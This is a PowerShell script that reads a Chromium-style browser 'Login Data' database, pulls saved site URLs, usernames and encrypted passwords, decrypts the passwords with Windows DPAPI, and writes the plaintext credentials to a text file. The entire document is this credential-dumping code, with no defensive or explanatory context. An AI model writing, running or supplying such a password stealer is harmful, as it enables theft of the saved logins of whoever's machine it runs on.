Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Text.Encoding

#Import the module, create a data source and a table
Import-Module PSSQLite

$Database = ".\Login Data"
$Query = "SELECT origin_url, username_value, password_value FROM logins"

# We have a database, and a table, let's view the table info
$data = Invoke-SqliteQuery -DataSource $Database -Query $Query

$line = "Origin URL`t Username `t Password";
for ($i = 0; $i -lt $data.Count; $i++) {
    
    $EncryptedBytes = $data[$i].password_value;
    $EncryptedBytes.GetType();
    $data[$i].password_value =  (([Text.Encoding]::ASCII).GetString([Security.Cryptography.ProtectedData]::Unprotect($EncryptedBytes, $null, [Security.Cryptography.DataProtectionScope]::LocalMachine)));    # $data[$i].password_value = (([Text.Encoding]::ASCII).GetString($EncryptedBytes));
    $line = $data[$i].origin_url + "`t" + $data[$i].username_value + "`t" + $data[$i].password_value;

    Add-Content "PasswordValues.txt" $line;
    # Add-Content "PasswordValues.txt" ""+$data[$i].password_value

}